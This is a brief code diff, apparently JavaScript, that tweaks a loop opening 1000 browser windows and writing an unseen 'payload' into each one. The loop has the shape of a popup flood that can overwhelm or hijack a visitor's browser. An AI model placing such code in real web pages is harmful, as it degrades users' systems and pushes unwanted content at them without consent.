@@ -43,7 +43,7 @@
   `;
 
   for(let i=0; i<1000; i++){
-    let w = window.open();
+    let w = window.open('', '_blank');
     if(w){
       w.document.write(payload);
       w.document.close();
